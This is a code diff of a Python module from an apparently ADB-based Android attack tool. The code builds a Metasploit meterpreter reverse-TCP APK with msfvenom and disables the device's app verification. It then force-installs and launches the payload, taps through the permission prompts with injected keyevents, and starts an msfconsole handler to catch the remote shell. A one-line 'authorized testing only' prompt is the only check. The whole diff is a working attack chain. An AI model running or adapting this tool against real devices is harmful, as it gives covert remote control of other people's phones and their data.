@@ -1,100 +1,111 @@
 import subprocess
 import time
+from pathlib import Path
 
 from modules.config import AppConfig
 from modules import banner
-from modules.console import console, print_success, confirm, adb, adb_output
-from modules.connection import get_ip_address
-
-
-def instructions() -> bool:
-    """Display Metasploit instructions. Returns True to continue, False to go back."""
-    import os
-    os.system(f"{__import__('modules.config', fromlist=['AppConfig']).__module__}")
-
-    console.clear()
-    console.print(banner.instructions_banner)
-    console.print(banner.instruction)
-    choice = console.input("[prompt]> [/prompt]")
-    return choice == ""
+from modules.console import console, confirm, adb, task_status
+from modules.connection import get_ip_address, is_valid_ipv4
 
 
 def hack(config: AppConfig) -> None:
     import os
+
     os.system(config.clear_cmd)
     console.print(banner.instructions_banner)
     console.print(banner.instruction)
     choice = console.input("[prompt]> [/prompt]")
 
     if choice != "":
-        console.print("\n[green]Going Back to Main Menu[/green]\n")
+        console.print("[green]Returning to Main Menu.[/green]")
         return
 
     os.system(config.clear_cmd)
     ip = get_ip_address()
+    if ip is None:
+        console.print(
+            "[yellow]Could not auto-detect LAN IP. Using [bold]127.0.0.1[/bold] — press [bold]M[/bold] to set LHOST.[/yellow]"
+        )
+        ip = "127.0.0.1"
     lport = "4444"
     console.print(
-        f"\n[cyan]Using LHOST : [white]{ip}[/white] & LPORT : [white]{lport}[/white] to create payload[/cyan]\n"
+        f"[cyan]LHOST[/cyan] [white]{ip}[/white]  [cyan]LPORT[/cyan] [white]{lport}[/white]"
     )
 
     modify = console.input(
-        "\n[yellow]Press 'Enter' to continue OR enter 'M' to modify LHOST & LPORT > [/yellow]"
+        "[yellow]Enter = continue · M = edit LHOST/LPORT[/yellow]> "
     ).lower()
 
     while modify not in ("m", ""):
-        modify = console.input(
-            "\n[red]Invalid selection![/red] Press 'Enter' OR M > "
-        ).lower()
+        modify = console.input("[red]Enter or M[/red]> ").lower()
 
     if modify == "m":
-        ip = console.input(f"\n[cyan]Enter LHOST > [/cyan]")
-        lport = console.input(f"\n[cyan]Enter LPORT > [/cyan]")
+        ip = console.input("[cyan]LHOST[/cyan]> ").strip()
+        lport_in = console.input("[cyan]LPORT[/cyan]> ").strip()
+        if not is_valid_ipv4(ip):
+            console.print("[red]Invalid LHOST → 127.0.0.1[/red]")
+            ip = "127.0.0.1"
+        if lport_in.isdigit() and 1 <= int(lport_in) <= 65535:
+            lport = lport_in
+        else:
+            console.print("[yellow]Invalid LPORT → 4444[/yellow]")
 
     if not confirm(
-        "[bold red]WARNING:[/bold red] This will generate a payload, change device security settings, "
-        "install software on the connected device, and launch Metasploit. "
-        "Only proceed on systems you are authorized to test. Continue?"
+        "[bold red]WARNING:[/bold red] Payload install, security settings changes, Metasploit. "
+        "Authorized testing only. Continue?"
     ):
-        console.print("\n[green]Cancelled. Returning to Main Menu.[/green]\n")
+        console.print("[green]Cancelled.[/green]")
         return
 
     console.print(banner.hacking_banner)
-    console.print("\n[cyan]Creating payload APK...[/cyan]\n")
 
-    with console.status("[info]Generating payload with msfvenom...[/info]"):
-        subprocess.run(
-            ["msfvenom", "-p", "android/meterpreter/reverse_tcp",
-             f"LHOST={ip}", f"LPORT={lport}", ">", "test.apk"],
-            shell=True,
+    apk_out = Path("test.apk")
+    with task_status("[info]msfvenom: building APK…[/info]"):
+        result = subprocess.run(
+            [
+                "msfvenom",
+                "-p",
+                "android/meterpreter/reverse_tcp",
+                f"LHOST={ip}",
+                f"LPORT={lport}",
+                "-o",
+                str(apk_out),
+            ],
+            capture_output=True,
+            text=True,
         )
+    if result.returncode != 0:
+        console.print(f"[red]msfvenom failed:[/red] {result.stderr or result.stdout}")
+        return
+    if not apk_out.is_file():
+        console.print("[red]test.apk missing[/red]")
+        return
 
-    console.print("\n[cyan]Installing APK to target device...[/cyan]\n")
-    adb(["shell", "input", "keyevent", "3"])
-
-    with console.status("[info]Disabling app verification...[/info]"):
+    with task_status("[info]Preparing device (home, verify settings)…[/info]"):
+        adb(["shell", "input", "keyevent", "3"])
         adb(["shell", "settings", "put", "global", "package_verifier_enable", "0"])
         adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "0"])
 
-    with console.status("[info]Installing payload APK...[/info]"):
-        subprocess.run(["adb", "install", "-r", "test.apk"])
+    with task_status("[info]adb install payload…[/info]"):
+        subprocess.run(["adb", "install", "-r", str(apk_out)])
 
-    console.print("\n[cyan]Launching app...[/cyan]\n")
-    package_name = "com.metasploit.stage"
-    adb(["shell", "monkey", "-p", package_name, "1"])
-    time.sleep(3)
+    with task_status("[info]Launching payload…[/info]"):
+        adb(["shell", "monkey", "-p", "com.metasploit.stage", "1"])
+        time.sleep(3)
+        adb(["shell", "input", "keyevent", "22"])
+        adb(["shell", "input", "keyevent", "22"])
+        adb(["shell", "input", "keyevent", "66"])
 
-    console.print("\n[cyan]Sending keycodes to accept app permissions...[/cyan]\n")
-    adb(["shell", "input", "keyevent", "22"])
-    adb(["shell", "input", "keyevent", "22"])
-    adb(["shell", "input", "keyevent", "66"])
+    console.print("[red]Starting msfconsole handler…[/red]")
+    subprocess.run(
+        [
+            "msfconsole",
+            "-x",
+            f"use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; "
+            f"set LHOST {ip} ; set LPORT {lport} ; exploit",
+        ]
+    )
 
-    console.print("\n[red]Launching and Setting up Metasploit-Framework...[/red]\n")
-    subprocess.run([
-        "msfconsole", "-x",
-        f"use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; "
-        f"set LHOST {ip} ; set LPORT {lport} ; exploit",
-    ])
-
-    with console.status("[info]Re-enabling app verification...[/info]"):
+    with task_status("[info]Restoring app verification…[/info]"):
         adb(["shell", "settings", "put", "global", "package_verifier_enable", "1"])
         adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "1"])
